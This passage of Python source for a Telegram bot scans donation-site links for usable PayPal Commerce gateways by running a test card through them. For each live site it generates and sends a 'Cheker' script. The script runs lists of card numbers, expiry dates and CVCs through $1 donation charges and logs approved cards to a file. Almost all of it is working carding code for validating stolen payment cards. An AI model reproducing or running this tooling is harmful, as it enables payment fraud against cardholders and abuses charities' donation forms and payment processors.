            if pr.lower() in result.lower():
                is_live = True
                break
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                safe_edit_message(massege.chat.id, ko.message_id, premium_emoji(f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}"))
                return
        
        if not is_live:
            safe_edit_message(massege.chat.id, ko.message_id, premium_emoji(f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}"))
            return

        # إنشاء ملف gateway
        file_name = str(f'gateway_{int(time.time())}.py')
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from datetime import datetime

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = "{paypal.client_id or ''}"
        self.access_token = "{paypal.access_token or ''}"
        self.client_token = "{paypal.client_token or ''}"
        self.form_data = {paypal.form_data}
        self.ajax_url = "{paypal.ajax_url or ''}"
        self.cookies = {paypal.cookies}
        self.url = "{paypal.url}"
        self.inurl = "{paypal.inurl}"
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            
            expiry = f"20{{yy}}-{{mm}}"
            order_id = self._create_order()
            
            if not order_id:
                return "Create Order Failed"
            
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            
            confirm_json = {{}}
            for auth_token in auth_tokens:
                he4 = {{
                    'authorization': f'Bearer {{auth_token}}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }}
                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                        }}
                    }},
                    'application_context': {{'vault': False}},
                }}
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                        headers=he4,
                        json=da3,
                        timeout=15
                    )
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {{}}
                        break
                except:
                    continue
            
            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                if 'INSUFFICIENT_FUNDS' in confirm_str:
                    return "INSUFFICIENT_FUNDS"
                if 'EXPIRED_CARD' in confirm_str:
                    return "EXPIRED_CARD"
                if 'ORDER_NOT_APPROVED' in confirm_str:
                    return "Payer cannot pay for this transaction."
            
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {{e}}"

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        
        text_upper = text.upper()
        text_lower = text.lower()
        
        if '<!DOCTYPE' in text_upper or '<html' in text_upper:
            return "DECLINED"
        
        if 'true' in text_lower or 'charge 1' in text_lower or 'charged' in text_lower or 'success' in text_lower:
            if 'error' not in text_lower:
                return "CHARGE 1.0"
        
        if 'insufficient' in text_lower:
            return "INSUFFICIENT_FUNDS"
        
        if 'order_not_approved' in text_lower:
            return "Payer cannot pay for this transaction."
        
        if 'expired_card' in text_lower:
            return "EXPIRED_CARD"
        elif 'declined' in text_lower or 'error' in text_lower:
            return "DECLINED"
        
        return text[:80]

    def _create_order(self):
        if self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({{
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        }})
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        actions = ['give_paypal_commerce_create_order', 'give_create_order']
        for action in actions:
            params = {{'action': action}}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    json_data = response.json()
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                            return json_data['data']['id']
                    if 'id' in json_data:
                        return json_data['id']
            except:
                continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {{
                'authorization': f'Bearer {{self.access_token}}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
                'paypal-request-id': str(uuid.uuid4()),
            }}
            data = {{
                'intent': 'CAPTURE',
                'purchase_units': [{{
                    'amount': {{'currency_code': 'USD', 'value': self.donation}}
                }}],
                'application_context': {{
                    'shipping_preference': 'NO_SHIPPING',
                    'user_action': 'PAY_NOW',
                }}
            }}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                return response.json().get('id')
            return None
        except:
            return None

    def _approve_order(self, order_id):
        if self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        
        if self.access_token:
            try:
                headers = {{
                    'authorization': f'Bearer {{self.access_token}}',
                    'content-type': 'application/json',
                    'user-agent': self.uu.random,
                }}
                response = self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{{order_id}}/capture',
                    headers=headers,
                    timeout=15
                )
                return response
            except:
                pass
        
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({{
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        }})
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order']
        for action in actions:
            params = {{'action': action, 'order': order_id}}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)''')
        
        # ✅ استخدام str() للتأكد
        safe_send_document(massege.chat.id, str(file_name), caption=premium_emoji(f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\n👑 Dev: @FAWZY30'''))
        os.remove(file_name)

    except Exception as e:
        print(traceback.format_exc())
        safe_edit_message(massege.chat.id, ko.message_id, premium_emoji(f"❌ Error: {str(e)[:100]}"))

# ============ أمر mass ============
@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, premium_emoji('❌ The admin has blocked you.'))
        return

    msg = safe_send_message(message.chat.id, premium_emoji("📁 Send a .txt file with links (one link per line):"))
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)

@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, premium_emoji("🛑 Stopping..."))
    else:
        safe_send_message(message.chat.id, premium_emoji("❌ No active process."))

def check_single_link(link):
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        
        paypal = PayPalLinkTester(target_url=link)
        result = paypal.Charge('4059986126444431|11|30|947')
        
        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                return {'link': link, 'live': False, 'respons': result}
        
        if is_live:
            return {
                'link': link,
                'live': True,
                'respons': result,
                'id_form1': paypal.form_data.get('give-form-id-prefix', ''),
                'id_form2': paypal.form_data.get('give-form-id', ''),
                'nonec': paypal.form_data.get('give-form-hash', ''),
                'au': paypal.client_token or paypal.access_token or '',
                'client_id': paypal.client_id or '',
                'access_token': paypal.access_token or '',
                'client_token': paypal.client_token or '',
                'form_data': paypal.form_data,
                'ajax_url': paypal.ajax_url or '',
                'cookies': paypal.cookies,
                'url': paypal.url,
                'inurl': paypal.inurl,
            }
        
        return {'link': link, 'live': False, 'respons': result}
        
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100]}

def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, premium_emoji("❌ Please send a .txt file."))
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            safe_send_message(message.chat.id, premium_emoji("❌ File is empty."))
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        
        status_msg = safe_send_message(chat_id, premium_emoji(f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
🔗 Url : ...
💬 Respons : ...
━━━━━━━━━━━━━━━━━━
⏱️ Checked 0 of {total}
🛑 /stop to stop"""))
        
        if not status_msg:
            return

        def update_status():
            last_text = ""
            while True:
                time.sleep(10)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = premium_emoji(f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
🔗 Url : <code>{current_url[:60] if current_url else '...'}</code>
💬 Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop to stop""")
                        
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except:
                                pass
                except:
                    pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()

        time.sleep(2)

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            
            result = check_single_link(link)
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    
                    try:
                        # إنشاء كود gateway
                        code = f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from datetime import datetime

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = "{result.get('client_id', '')}"
        self.access_token = "{result.get('access_token', '')}"
        self.client_token = "{result.get('client_token', '')}"
        self.form_data = {result.get('form_data', {{}})}
        self.ajax_url = "{result.get('ajax_url', '')}"
        self.cookies = {result.get('cookies', {{}})}
        self.url = "{result.get('url', '')}"
        self.inurl = "{result.get('inurl', '')}"
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            
            expiry = f"20{{yy}}-{{mm}}"
            order_id = self._create_order()
            
            if not order_id:
                return "Create Order Failed"
            
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            
            confirm_json = {{}}
            for auth_token in auth_tokens:
                he4 = {{
                    'authorization': f'Bearer {{auth_token}}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }}
                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                        }}
                    }},
                    'application_context': {{'vault': False}},
                }}
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                        headers=he4,
                        json=da3,
                        timeout=15
                    )
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {{}}
                        break
                except:
                    continue
            
            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                if 'INSUFFICIENT_FUNDS' in confirm_str:
                    return "INSUFFICIENT_FUNDS"
                if 'EXPIRED_CARD' in confirm_str:
                    return "EXPIRED_CARD"
                if 'ORDER_NOT_APPROVED' in confirm_str:
                    return "Payer cannot pay for this transaction."
            
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {{e}}"

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_upper = text.upper()
        text_lower = text.lower()
        if '<!DOCTYPE' in text_upper or '<html' in text_upper:
            return "DECLINED"
        if 'true' in text_lower or 'charge 1' in text_lower or 'charged' in text_lower or 'success' in text_lower:
            if 'error' not in text_lower:
                return "CHARGE 1.0"
        if 'insufficient' in text_lower:
            return "INSUFFICIENT_FUNDS"
        if 'order_not_approved' in text_lower:
            return "Payer cannot pay for this transaction."
        if 'expired_card' in text_lower:
            return "EXPIRED_CARD"
        elif 'declined' in text_lower or 'error' in text_lower:
            return "DECLINED"
        return text[:80]

    def _create_order(self):
        if self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({{
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        }})
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        actions = ['give_paypal_commerce_create_order', 'give_create_order']
        for action in actions:
            params = {{'action': action}}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    json_data = response.json()
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                            return json_data['data']['id']
                    if 'id' in json_data:
                        return json_data['id']
            except:
                continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {{
                'authorization': f'Bearer {{self.access_token}}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
                'paypal-request-id': str(uuid.uuid4()),
            }}
            data = {{
                'intent': 'CAPTURE',
                'purchase_units': [{{
                    'amount': {{'currency_code': 'USD', 'value': self.donation}}
                }}],
                'application_context': {{
                    'shipping_preference': 'NO_SHIPPING',
                    'user_action': 'PAY_NOW',
                }}
            }}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                return response.json().get('id')
            return None
        except:
            return None

    def _approve_order(self, order_id):
        if self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        if self.access_token:
            try:
                headers = {{
                    'authorization': f'Bearer {{self.access_token}}',
                    'content-type': 'application/json',
                    'user-agent': self.uu.random,
                }}
                response = self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{{order_id}}/capture',
                    headers=headers,
                    timeout=15
                )
                return response
            except:
                pass
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({{
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        }})
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order']
        for action in actions:
            params = {{'action': action, 'order': order_id}}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)'''
                        
                        file_name = str(f'gateway_{live_idx}.py')
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        
                        # ✅ استخدام str() للتأكد
                        safe_send_document(chat_id, str(file_name), caption=premium_emoji(f"""✅ <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Respons:</b> <code>{result['respons']}</code>
━━━━━━━━━━━━━━━━━━━━
👑 Dev: @FAWZY30"""))
                        os.remove(file_name)
                        time.sleep(2)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                        print(traceback.format_exc())
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            
            time.sleep(2)
        
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        
        updater.join(timeout=2)
        
        final_text = premium_emoji(f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live (Sent): {live}
❌ Dead: {dead}
💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
👑 Dev: @FAWZY30""")
        
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)
        
        if user_id in processing_status:
            del processing_status[user_id]
            
    except Exception as e:
        print(traceback.format_exc())
        safe_send_message(message.chat.id, premium_emoji(f"❌ Error: {str(e)[:100]}"))

# === نظام الحظر ===
@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, premium_emoji("❌ You do not have permission."))
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, premium_emoji(f"✅ User ID {user_id_to_block} blocked."))
    except:
        safe_send_message(message.chat.id, premium_emoji("💡 Usage: /block2 [user_id]"))

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, premium_emoji("❌ You do not have permission."))
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, premium_emoji(f"✅ User ID {user_id_to_unblock} unblocked."))
    except:
        safe_send_message(message.chat.id, premium_emoji("💡 Usage: /unblock2 [user_id]"))

# === تشغيل البوت ===
print('✅ Bot is running...')
try:
    bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
except Exception as e:
    print(f'❌ Error: {e}')
    print(traceback.format_exc())
